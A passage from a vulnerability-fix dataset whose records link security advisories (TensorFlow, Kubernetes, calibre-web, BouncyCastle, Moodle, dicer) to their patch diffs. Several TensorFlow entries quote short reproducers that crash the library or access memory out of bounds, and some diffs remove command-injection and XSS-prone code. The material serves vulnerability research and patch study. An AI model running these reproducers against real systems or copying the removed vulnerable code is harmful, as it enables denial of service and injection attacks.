loop.","published_date":"2022-05-21","chain_len":1,"project":"https:\/\/github.com\/mscdex\/dicer","commit_href":"https:\/\/github.com\/mscdex\/dicer\/pull\/22\/commits\/b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac","commit_sha":"b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac","patch":"SINGLE","chain_ord":"['b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac']","before_first_fix_commit":"{'524254c4af4e8f2ed070facac8f6d91538b41eef'}","last_fix_commit":"b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac","chain_ord_pos":1.0,"commit_datetime":"08\/10\/2021, 09:41:48","message":"removed bug caused by uninitialized variable h in function HeaderParser.prototype._parseHeader","author":"Roland Heinze","comments":null,"stats":"{'additions': 20, 'deletions': 18, 'total': 38}","files":"{'lib\/HeaderParser.js': {'additions': 20, 'deletions': 18, 'changes': 38, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mscdex\/dicer\/raw\/b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac\/lib%2FHeaderParser.js', 'patch': \"@@ -82,26 +82,28 @@ HeaderParser.prototype._parseHeader = function() {\\n       \/\/ folded header content\\n       \/\/ RFC2822 says to just remove the CRLF and not the whitespace following\\n       \/\/ it, so we follow the RFC and include the leading whitespace ...\\n-      this.header[h][this.header[h].length - 1] += lines[i];\\n-    } else {\\n-      m = RE_HDR.exec(lines[i]);\\n-      if (m) {\\n-        h = m[1].toLowerCase();\\n-        if (m[2]) {\\n-          if (this.header[h] === undefined)\\n-            this.header[h] = [m[2]];\\n-          else\\n-            this.header[h].push(m[2]);\\n-        } else\\n-          this.header[h] = [''];\\n-        if (++this.npairs === this.maxHeaderPairs)\\n-          break;\\n-      } else {\\n-        this.buffer = lines[i];\\n-        modded = true;\\n-        break;\\n+      if (h) {\\n+        this.header[h][this.header[h].length - 1] += lines[i];\\n+        continue;\\n       }\\n     }\\n+    m = RE_HDR.exec(lines[i]);\\n+    if (m) {\\n+      h = m[1].toLowerCase();\\n+      if (m[2]) {\\n+        if (this.header[h] === undefined)\\n+          this.header[h] = [m[2]];\\n+        else\\n+          this.header[h].push(m[2]);\\n+      } else\\n+        this.header[h] = [''];\\n+      if (++this.npairs === this.maxHeaderPairs)\\n+        break;\\n+    } else {\\n+      this.buffer = lines[i];\\n+      modded = true;\\n+      break;\\n+    }\\n   }\\n   if (!modded)\\n     this.buffer = '';\"}}","message_norm":"removed bug caused by uninitialized variable h in function headerparser.prototype._parseheader","language":"en","entities":"[('removed', 'ACTION', ''), ('bug', 'FLAW', ''), ('uninitialized', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/HeaderParser.js'])","num_files":1.0},{"index":3302,"vuln_id":"GHSA-wp3c-xw9g-gpcg","cwe_id":"{'CWE-617'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/7ae2af34087fb4b5c8915279efd03da3b81028bc'}","dataset":"osv","summary":"Lack of validation in `SparseDenseCwiseMul` ### Impact\nDue to lack of validation in `tf.raw_ops.SparseDenseCwiseMul`, an attacker can trigger denial of service via `CHECK`-fails or accesses to outside the bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\nindices = tf.constant([], shape=[10, 0], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\nshape = tf.constant([0, 0], shape=[2], dtype=tf.int64)\ndense = tf.constant([], shape=[0], dtype=tf.int64)\n  \ntf.raw_ops.SparseDenseCwiseMul(\n    sp_indices=indices, sp_values=values, sp_shape=shape, dense=dense)\n```\n\nSince the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/38178a2f7a681a7835bb0912702a134bfe3b4d84\/tensorflow\/core\/kernels\/sparse_dense_binary_op_shared.cc#L68-L80) only validates the rank of the input arguments but no [constraints between dimensions](https:\/\/www.tensorflow.org\/api_docs\/python\/tf\/raw_ops\/SparseDenseCwiseMul), an attacker can abuse them to trigger internal `CHECK` assertions (and cause program termination, denial of service) or to write to memory outside of bounds of heap allocated tensor buffers.\n\n### Patches\nWe have patched the issue in GitHub commit [7ae2af34087fb4b5c8915279efd03da3b81028bc](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/7ae2af34087fb4b5c8915279efd03da3b81028bc).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/7ae2af34087fb4b5c8915279efd03da3b81028bc","commit_sha":"7ae2af34087fb4b5c8915279efd03da3b81028bc","patch":"SINGLE","chain_ord":"['7ae2af34087fb4b5c8915279efd03da3b81028bc']","before_first_fix_commit":"{'38178a2f7a681a7835bb0912702a134bfe3b4d84'}","last_fix_commit":"7ae2af34087fb4b5c8915279efd03da3b81028bc","chain_ord_pos":1.0,"commit_datetime":"05\/05\/2021, 04:30:50","message":"Fix heap-buffer-overflow issue with `tf.raw_ops.SparseDenseCwiseMul`.\n\nPiperOrigin-RevId: 372054410\nChange-Id: Ifcce0491e2e3816838c87e73be30a1e61b65174d","author":"Amit Patankar","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/sparse_dense_binary_op_shared.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/7ae2af34087fb4b5c8915279efd03da3b81028bc\/tensorflow%2Fcore%2Fkernels%2Fsparse_dense_binary_op_shared.cc', 'patch': '@@ -78,6 +78,11 @@ class SparseDenseBinaryOpShared : public OpKernel {\\n                     \"but received shapes: \",\\n                     values_t->shape().DebugString(), \" and \",\\n                     shape_t->shape().DebugString()));\\n+    OP_REQUIRES(\\n+        ctx, values_t->dim_size(0) == indices_t->dim_size(0),\\n+        errors::InvalidArgument(\\n+            \"The first dimension of values and indices should match. (\",\\n+            values_t->dim_size(0), \" vs. \", indices_t->dim_size(0), \")\"));\\n \\n     const auto indices_mat = indices_t->matrix<int64>();\\n     const auto shape_vec = shape_t->vec<int64>();'}}","message_norm":"fix heap-buffer-overflow issue with `tf.raw_ops.sparsedensecwisemul`.\n\npiperorigin-revid: 372054410\nchange-id: ifcce0491e2e3816838c87e73be30a1e61b65174d","language":"en","entities":"[('fix', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('issue', 'FLAW', ''), ('372054410', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_dense_binary_op_shared.cc'])","num_files":1.0},{"index":3303,"vuln_id":"GHSA-wp77-4gmm-7cq8","cwe_id":"{'CWE-476'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9728c60e136912a12d99ca56e106b7cce7af5986'}","dataset":"osv","summary":"Incorrect validation of `SaveV2` inputs ### Impact\nThe code for `tf.raw_ops.SaveV2` does not properly validate the inputs and an attacker can trigger a null pointer dereference:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SaveV2(\n  prefix=['tensorflow'],\n  tensor_name=['v'],\n  shape_and_slices=[],\n  tensors=[1,2,3])\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8d72537c6abf5a44103b57b9c2e22c14f5f49698\/tensorflow\/core\/kernels\/save_restore_v2_ops.cc) uses `ValidateInputs` to  check that the input arguments are valid. This validation would have caught the illegal state represented by the reproducer  above.\n\nHowever, the validation uses `OP_REQUIRES` which translates to setting the `Status` object of the current `OpKernelContext` to an error status, followed by an empty `return` statement which just terminates the execution of the function it is present in. However, this does not mean that the kernel execution is finalized: instead, execution continues from the next line in `Compute` that follows the call to `ValidateInputs`. This is equivalent to lacking the validation.\n      \n### Patches\nWe have patched the issue in GitHub commit [9728c60e136912a12d99ca56e106b7cce7af5986](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9728c60e136912a12d99ca56e106b7cce7af5986).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.                                                                                                                                                                                                                                               \n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9728c60e136912a12d99ca56e106b7cce7af5986","commit_sha":"9728c60e136912a12d99ca56e106b7cce7af5986","patch":"SINGLE","chain_ord":"['9728c60e136912a12d99ca56e106b7cce7af5986']","before_first_fix_commit":"{'f2a673bd34f0d64b8e40a551ac78989d16daad09'}","last_fix_commit":"9728c60e136912a12d99ca56e106b7cce7af5986","chain_ord_pos":1.0,"commit_datetime":"07\/31\/2021, 02:05:41","message":"Ensure validation sticks in `save_restore_v2_ops.cc`\n\nPiperOrigin-RevId: 387924206\nChange-Id: I6156842eb3230076b5812c0815f3e66bd5241454","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/save_restore_v2_ops.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/9728c60e136912a12d99ca56e106b7cce7af5986\/tensorflow%2Fcore%2Fkernels%2Fsave_restore_v2_ops.cc', 'patch': '@@ -98,6 +98,7 @@ class SaveV2 : public OpKernel {\\n     const Tensor& shape_and_slices = context->input(2);\\n     ValidateInputs(true \/* is save op *\/, context, prefix, tensor_names,\\n                    shape_and_slices);\\n+    if (!context->status().ok()) return;\\n \\n     const int kFixedInputs = 3;  \/\/ Prefix, tensor names, shape_and_slices.\\n     const int num_tensors = static_cast<int>(tensor_names.NumElements());\\n@@ -177,6 +178,7 @@ class RestoreV2 : public OpKernel {\\n                                         \" expected dtypes.\"));\\n     ValidateInputs(false \/* not save op *\/, context, prefix, tensor_names,\\n                    shape_and_slices);\\n+    if (!context->status().ok()) return;\\n \\n     const string& prefix_string = prefix.scalar<tstring>()();'}}","message_norm":"ensure validation sticks in `save_restore_v2_ops.cc`\n\npiperorigin-revid: 387924206\nchange-id: i6156842eb3230076b5812c0815f3e66bd5241454","language":"en","entities":"[('ensure', 'ACTION', ''), ('387924206', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/save_restore_v2_ops.cc'])","num_files":1.0},{"index":3313,"vuln_id":"GHSA-wqwf-x5cj-rg56","cwe_id":"{'CWE-78'}","score":7.1,"chain":"{'https:\/\/github.com\/kubernetes\/kubernetes\/commit\/d65039c56ce4de5f2efdc38aa1284eeb95f89169'}","dataset":"osv","summary":"Arbitrary Command Injection In Kubernetes versions 1.9.0-1.9.9, 1.10.0-1.10.5, and 1.11.0-1.11.1, user input was handled insecurely while setting up volume mounts on Windows nodes, which could lead to command line argument injection.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/kubernetes\/kubernetes","commit_href":"https:\/\/github.com\/kubernetes\/kubernetes\/commit\/d65039c56ce4de5f2efdc38aa1284eeb95f89169","commit_sha":"d65039c56ce4de5f2efdc38aa1284eeb95f89169","patch":"SINGLE","chain_ord":"['d65039c56ce4de5f2efdc38aa1284eeb95f89169']","before_first_fix_commit":"{'dc0afb24d138220cb53d9be3298f1539b0be4f7a', '27bc865cc1bffb97d4dff38492aa9f830f859e45'}","last_fix_commit":"d65039c56ce4de5f2efdc38aa1284eeb95f89169","chain_ord_pos":1.0,"commit_datetime":"07\/03\/2018, 13:16:06","message":"Merge pull request #65751 from andyzhangx\/mount-windows-fix\n\nAutomatic merge from submit-queue (batch tested with PRs 65381, 65751). If you want to cherry-pick this change to another branch, please follow the instructions <a href=\"https:\/\/github.com\/kubernetes\/community\/blob\/master\/contributors\/devel\/cherry-picks.md\">here<\/a>.\n\nfix smb mount security issue\n\n**What this PR does \/ why we need it**:\r\nfix smb mount security issue:\r\nuser PowerShell Environment Variables to store user input string to prevent command line injection, the env var in PowerShell would be taken as literal values and not as executable vulnerable code, this kind of fix is common for command line injection issue (called: parameterized way)\r\n\r\nOriginally use go sdk for `New-SmbGlobalMapping` is best solution, while after discussion with Windows team, go API for `New-SmbGlobalMapping` is not ready yet and the new functionality of basic win32 API [NetUseAdd](https:\/\/msdn.microsoft.com\/en-us\/library\/windows\/desktop\/aa370645(v=vs.85).aspx) is not public yet, use [PowerShell with Environment Variables](https:\/\/docs.microsoft.com\/en-us\/powershell\/module\/microsoft.powershell.core\/about\/about_environment_variables?view=powershell-5.1) is also their recommended way.\r\n\r\n**Which issue(s) this PR fixes** *(optional, in `fixes #<issue number>(, fixes #<issue_number>, ...)` format, will close the issue(s) when PR gets merged)*:\r\nFixes #65750 \r\n\r\n**Special notes for your reviewer**:\r\n - This is a security issue fix, no behavior change, E2E test of smb mount passes.\r\n - Original logging as `azureMount` is incorrect since this mount_windows is for mount disk & smb, it's a common feature on Windows, not specific to Azure, I will send another PR to fixing all the logging naming issue, anyway it's not related to this security issue. Let's keep this PR simple.\r\n\r\n**Release note**:\r\n\r\n```\r\nfix smb mount security issue\r\n```\r\n\r\n\/sig windows\r\n\/sig storage\r\n\/kind bug\r\n\r\n@jessfraz \r\n\/assign @jsafrane @msau42","author":"Kubernetes Submit Queue","comments":null,"stats":"{'additions': 12, 'deletions': 6, 'total': 18}","files":"{'pkg\/util\/mount\/mount_windows.go': {'additions': 12, 'deletions': 6, 'changes': 18, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kubernetes\/kubernetes\/raw\/d65039c56ce4de5f2efdc38aa1284eeb95f89169\/pkg%2Futil%2Fmount%2Fmount_windows.go', 'patch': '@@ -83,14 +83,20 @@ func (mounter *Mounter) Mount(source string, target string, fstype string, optio\\n \\t\\t\\treturn fmt.Errorf(\"azureMount: only cifs mount is supported now, fstype: %q, mounting source (%q), target (%q), with options (%q)\", fstype, source, target, options)\\n \\t\\t}\\n \\n-\\t\\tcmdLine := fmt.Sprintf(`$User = \"%s\";$PWord = ConvertTo-SecureString -String \"%s\" -AsPlainText -Force;`+\\n-\\t\\t\\t`$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $PWord`,\\n-\\t\\t\\toptions[0], options[1])\\n-\\n \\t\\tbindSource = source\\n-\\t\\tcmdLine += fmt.Sprintf(\";New-SmbGlobalMapping -RemotePath %s -Credential $Credential\", source)\\n \\n-\\t\\tif output, err := exec.Command(\"powershell\", \"\/c\", cmdLine).CombinedOutput(); err != nil {\\n+\\t\\t\/\/ use PowerShell Environment Variables to store user input string to prevent command line injection\\n+\\t\\t\/\/ https:\/\/docs.microsoft.com\/en-us\/powershell\/module\/microsoft.powershell.core\/about\/about_environment_variables?view=powershell-5.1\\n+\\t\\tcmdLine := fmt.Sprintf(`$PWord = ConvertTo-SecureString -String $Env:smbpassword -AsPlainText -Force` +\\n+\\t\\t\\t`;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Env:smbuser, $PWord` +\\n+\\t\\t\\t`;New-SmbGlobalMapping -RemotePath $Env:smbremotepath -Credential $Credential`)\\n+\\n+\\t\\tcmd := exec.Command(\"powershell\", \"\/c\", cmdLine)\\n+\\t\\tcmd.Env = append(os.Environ(),\\n+\\t\\t\\tfmt.Sprintf(\"smbuser=%s\", options[0]),\\n+\\t\\t\\tfmt.Sprintf(\"smbpassword=%s\", options[1]),\\n+\\t\\t\\tfmt.Sprintf(\"smbremotepath=%s\", source))\\n+\\t\\tif output, err := cmd.CombinedOutput(); err != nil {\\n \\t\\t\\treturn fmt.Errorf(\"azureMount: SmbGlobalMapping failed: %v, only SMB mount is supported now, output: %q\", err, string(output))\\n \\t\\t}\\n \\t}'}}","message_norm":"merge pull request #65751 from andyzhangx\/mount-windows-fix\n\nautomatic merge from submit-queue (batch tested with prs 65381, 65751). if you want to cherry-pick this change to another branch, please follow the instructions <a href=\"https:\/\/github.com\/kubernetes\/community\/blob\/master\/contributors\/devel\/cherry-picks.md\">here<\/a>.\n\nfix smb mount security issue\n\n**what this pr does \/ why we need it**:\r\nfix smb mount security issue:\r\nuser powershell environment variables to store user input string to prevent command line injection, the env var in powershell would be taken as literal values and not as executable vulnerable code, this kind of fix is common for command line injection issue (called: parameterized way)\r\n\r\noriginally use go sdk for `new-smbglobalmapping` is best solution, while after discussion with windows team, go api for `new-smbglobalmapping` is not ready yet and the new functionality of basic win32 api [netuseadd](https:\/\/msdn.microsoft.com\/en-us\/library\/windows\/desktop\/aa370645(v=vs.85).aspx) is not public yet, use [powershell with environment variables](https:\/\/docs.microsoft.com\/en-us\/powershell\/module\/microsoft.powershell.core\/about\/about_environment_variables?view=powershell-5.1) is also their recommended way.\r\n\r\n**which issue(s) this pr fixes** *(optional, in `fixes #<issue number>(, fixes #<issue_number>, ...)` format, will close the issue(s) when pr gets merged)*:\r\nfixes #65750 \r\n\r\n**special notes for your reviewer**:\r\n - this is a security issue fix, no behavior change, e2e test of smb mount passes.\r\n - original logging as `azuremount` is incorrect since this mount_windows is for mount disk & smb, it's a common feature on windows, not specific to azure, i will send another pr to fixing all the logging naming issue, anyway it's not related to this security issue. let's keep this pr simple.\r\n\r\n**release note**:\r\n\r\n```\r\nfix smb mount security issue\r\n```\r\n\r\n\/sig windows\r\n\/sig storage\r\n\/kind bug\r\n\r\n@jessfraz \r\n\/assign @jsafrane @msau42","language":"en","entities":"[('#65751', 'ISSUE', ''), ('href=\"https:\/\/github.com', 'URL', ''), ('security', 'SECWORD', ''), ('issue', 'FLAW', ''), ('fix', 'ACTION', ''), ('security', 'SECWORD', ''), ('issue', 'FLAW', ''), ('prevent', 'ACTION', ''), ('injection', 'SECWORD', ''), ('vulnerable', 'SECWORD', ''), ('injection', 'SECWORD', ''), ('issue', 'FLAW', ''), ('netuseadd](https:\/\/msdn.microsoft.com', 'URL', ''), ('variables](https:\/\/docs.microsoft.com', 'URL', ''), ('issue(s', 'FLAW', ''), ('fixes', 'ACTION', ''), ('fixes', 'ACTION', ''), ('issue', 'FLAW', ''), ('fixes', 'ACTION', ''), ('issue(s', 'FLAW', ''), ('fixes', 'ACTION', ''), ('#65750', 'ISSUE', ''), ('security', 'SECWORD', ''), ('issue', 'FLAW', ''), ('fixing', 'ACTION', ''), ('issue', 'FLAW', ''), ('security', 'SECWORD', ''), ('issue', 'FLAW', ''), ('fix', 'ACTION', ''), ('security', 'SECWORD', ''), ('issue', 'FLAW', ''), ('bug', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['pkg\/util\/mount\/mount_windows.go'])","num_files":1.0},{"index":3314,"vuln_id":"GHSA-wrp6-9w7f-3wxg","cwe_id":"{'CWE-79'}","score":7.3,"chain":"{'https:\/\/github.com\/janeczku\/calibre-web\/commit\/7ad419dc8c12180e842a82118f4866ac3d074bc5'}","dataset":"osv","summary":"calibre-web is vulnerable to Cross-site Scripting calibre-web is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","published_date":"2022-01-21","chain_len":1,"project":"https:\/\/github.com\/janeczku\/calibre-web","commit_href":"https:\/\/github.com\/janeczku\/calibre-web\/commit\/7ad419dc8c12180e842a82118f4866ac3d074bc5","commit_sha":"7ad419dc8c12180e842a82118f4866ac3d074bc5","patch":"SINGLE","chain_ord":"['7ad419dc8c12180e842a82118f4866ac3d074bc5']","before_first_fix_commit":"{'bcdc97641447965af486964537f3821f47b28874'}","last_fix_commit":"7ad419dc8c12180e842a82118f4866ac3d074bc5","chain_ord_pos":1.0,"commit_datetime":"11\/20\/2021, 12:40:23","message":"Fix upload of cover and book formats containing html characters","author":"Ozzie Isaacs","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'cps\/static\/js\/edit_books.js': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/janeczku\/calibre-web\/raw\/7ad419dc8c12180e842a82118f4866ac3d074bc5\/cps%2Fstatic%2Fjs%2Fedit_books.js', 'patch': '@@ -248,15 +248,15 @@ $(\"#btn-upload-format\").on(\"change\", function () {\\n     if (filename.substring(3, 11) === \"fakepath\") {\\n         filename = filename.substring(12);\\n     } \/\/ Remove c:\\\\fake at beginning from localhost chrome\\n-    $(\"#upload-format\").html(filename);\\n+    $(\"#upload-format\").text(filename);\\n });\\n \\n $(\"#btn-upload-cover\").on(\"change\", function () {\\n     var filename = $(this).val();\\n     if (filename.substring(3, 11) === \"fakepath\") {\\n         filename = filename.substring(12);\\n     } \/\/ Remove c:\\\\fake at beginning from localhost chrome\\n-    $(\"#upload-cover\").html(filename);\\n+    $(\"#upload-cover\").text(filename);\\n });\\n \\n $(\"#xchange\").click(function () {'}}","message_norm":"fix upload of cover and book formats containing html characters","language":"en","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['cps\/static\/js\/edit_books.js'])","num_files":1.0},{"index":3318,"vuln_id":"GHSA-wrwf-pmmj-w989","cwe_id":"{'CWE-203'}","score":5.9,"chain":"{'https:\/\/github.com\/bcgit\/bc-java\/commit\/a00b684465b38d722ca9a3543b8af8568e6bad5c'}","dataset":"osv","summary":"Observable Discrepancy in BouncyCastle BouncyCastle TLS prior to version 1.0.3, when configured to use the JCE (Java Cryptography Extension) for cryptographic functions, provides a weak Bleichenbacher oracle when any TLS cipher suite using RSA key exchange is negotiated. An attacker can recover the private key from a vulnerable application. This vulnerability is referred to as \"ROBOT.\"","published_date":"2022-05-13","chain_len":1,"project":"https:\/\/github.com\/bcgit\/bc-java","commit_href":"https:\/\/github.com\/bcgit\/bc-java\/commit\/a00b684465b38d722ca9a3543b8af8568e6bad5c","commit_sha":"a00b684465b38d722ca9a3543b8af8568e6bad5c","patch":"SINGLE","chain_ord":"['a00b684465b38d722ca9a3543b8af8568e6bad5c']","before_first_fix_commit":"{'199be1bdc892dcb3360af1b5a887a7e133d2cdac'}","last_fix_commit":"a00b684465b38d722ca9a3543b8af8568e6bad5c","chain_ord_pos":1.0,"commit_datetime":"12\/12\/2017, 01:41:43","message":"Confirm size of decrypted PMS before using","author":"Peter Dettman","comments":"{'com_1': {'author': 'carnil', 'datetime': '12\/12\/2017, 20:44:47', 'body': 'CVE-2017-13098'}, 'com_2': {'author': 'bcgit', 'datetime': '12\/12\/2017, 23:34:09', 'body': 'This is also available in the current beta in https:\/\/www.bouncycastle.org\/betas 159b09 or later.'}, 'com_3': {'author': 'zenithravi', 'datetime': '12\/14\/2017, 09:12:16', 'body': 'Any plan ? When fix for CVE-2017-13098 (159b09) will be released ?'}, 'com_4': {'author': 'bcgit', 'datetime': '12\/14\/2017, 11:05:34', 'body': \"We're hoping to have 1.59 out in the next week or so.\"}}","stats":"{'additions': 5, 'deletions': 1, 'total': 6}","files":"{'tls\/src\/main\/java\/org\/bouncycastle\/tls\/crypto\/impl\/jcajce\/JceDefaultTlsCredentialedDecryptor.java': {'additions': 5, 'deletions': 1, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bcgit\/bc-java\/raw\/a00b684465b38d722ca9a3543b8af8568e6bad5c\/tls%2Fsrc%2Fmain%2Fjava%2Forg%2Fbouncycastle%2Ftls%2Fcrypto%2Fimpl%2Fjcajce%2FJceDefaultTlsCredentialedDecryptor.java', 'patch': '@@ -97,7 +97,11 @@ protected TlsSecret safeDecryptPreMasterSecret(TlsCryptoParameters cryptoParams,\\n         {\\n             Cipher c = crypto.createRSAEncryptionCipher();\\n             c.init(Cipher.DECRYPT_MODE, rsaServerPrivateKey);\\n-            M = c.doFinal(encryptedPreMasterSecret);\\n+            byte[] m = c.doFinal(encryptedPreMasterSecret);\\n+            if (m != null && m.length == 48)\\n+            {\\n+                M = m;\\n+            }\\n         }\\n         catch (Exception e)\\n         {'}}","message_norm":"confirm size of decrypted pms before using","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tls\/src\/main\/java\/org\/bouncycastle\/tls\/crypto\/impl\/jcajce\/JceDefaultTlsCredentialedDecryptor.java'])","num_files":1.0},{"index":3323,"vuln_id":"GHSA-wvh5-78h5-gmgr","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/moodle\/moodle\/commit\/6abe964bbac41b5e40a81b40962f7044b0dc201e'}","dataset":"osv","summary":"Cross-site Scripting in moodle A flaw was found in moodle where ID numbers displayed when bulk allocating markers to assignments required additional sanitizing to prevent a stored XSS risk.","published_date":"2022-05-19","chain_len":1,"project":"https:\/\/github.com\/moodle\/moodle","commit_href":"https:\/\/github.com\/moodle\/moodle\/commit\/6abe964bbac41b5e40a81b40962f7044b0dc201e","commit_sha":"6abe964bbac41b5e40a81b40962f7044b0dc201e","patch":"SINGLE","chain_ord":"['6abe964bbac41b5e40a81b40962f7044b0dc201e']","before_first_fix_commit":"{'11b2cc4cb5cf0693414f0e84cb790e487ae33a24'}","last_fix_commit":"6abe964bbac41b5e40a81b40962f7044b0dc201e","chain_ord_pos":1.0,"commit_datetime":"03\/15\/2022, 00:10:25","message":"MDL-74204 mod_assign: escape identity fields in allocate marker form.","author":"Paul Holden","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'mod\/assign\/classes\/output\/renderer.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/moodle\/moodle\/raw\/6abe964bbac41b5e40a81b40962f7044b0dc201e\/mod%2Fassign%2Fclasses%2Foutput%2Frenderer.php', 'patch': \"@@ -168,7 +168,7 @@ public function render_assign_user_summary(\\\\assign_user_summary $summary) {\\n             $fullname = fullname($summary->user, $summary->viewfullnames);\\n             $extrainfo = array();\\n             foreach ($summary->extrauserfields as $extrafield) {\\n-                $extrainfo[] = $summary->user->$extrafield;\\n+                $extrainfo[] = s($summary->user->$extrafield);\\n             }\\n             if (count($extrainfo)) {\\n                 $fullname .= ' (' . implode(', ', $extrainfo) . ')';\"}}","message_norm":"mdl-74204 mod_assign: escape identity fields in allocate marker form.","language":"en","entities":"[('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['mod\/assign\/classes\/output\/renderer.php'])","num_files":1.0},{"index":3326,"vuln_id":"GHSA-wvjw-p9f5-vq28","cwe_id":"{'CWE-755'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/82e6203221865de4008445b13c69b6826d2b28d9'}","dataset":"osv","summary":"Segfault in `tf.raw_ops.SparseCountSparseOutput` ### Impact\nPassing invalid arguments (e.g., discovered via fuzzing) to `tf.raw_ops.SparseCountSparseOutput` results in segfault.\n\n### Patches\nWe have patched the issue in GitHub commit [82e6203221865de4008445b13c69b6826d2b28d9](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/82e6203221865de4008445b13c69b6826d2b28d9).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/82e6203221865de4008445b13c69b6826d2b28d9","commit_sha":"82e6203221865de4008445b13c69b6826d2b28d9","patch":"SINGLE","chain_ord":"['82e6203221865de4008445b13c69b6826d2b28d9']","before_first_fix_commit":"{'0e182ba66c18db83668c05d26ee0c84ca9e2dbff'}","last_fix_commit":"82e6203221865de4008445b13c69b6826d2b28d9","chain_ord_pos":1.0,"commit_datetime":"03\/03\/2021, 01:02:03","message":"Fix segfaults in `tf.raw_ops.SparseCountSparseOutput`.\n\nPiperOrigin-RevId: 360547563\nChange-Id: I781c7af4b54a63d867c6e18d43a44d64a5c4e7c9","author":"Amit Patankar","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'tensorflow\/core\/kernels\/count_ops.cc': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/82e6203221865de4008445b13c69b6826d2b28d9\/tensorflow%2Fcore%2Fkernels%2Fcount_ops.cc', 'patch': '@@ -192,6 +192,10 @@ class SparseCount : public OpKernel {\\n               \"; values shape: \", values.shape().DebugString()));\\n     }\\n \\n+    OP_REQUIRES(context, shape.NumElements() != 0,\\n+                errors::InvalidArgument(\\n+                    \"The shape argument requires at least one element.\"));\\n+\\n     bool is_1d = shape.NumElements() == 1;\\n     int num_batches = is_1d ? 1 : shape.flat<int64>()(0);\\n     int num_values = values.NumElements();\\n@@ -212,6 +216,14 @@ class SparseCount : public OpKernel {\\n \\n     for (int idx = 0; idx < num_values; ++idx) {\\n       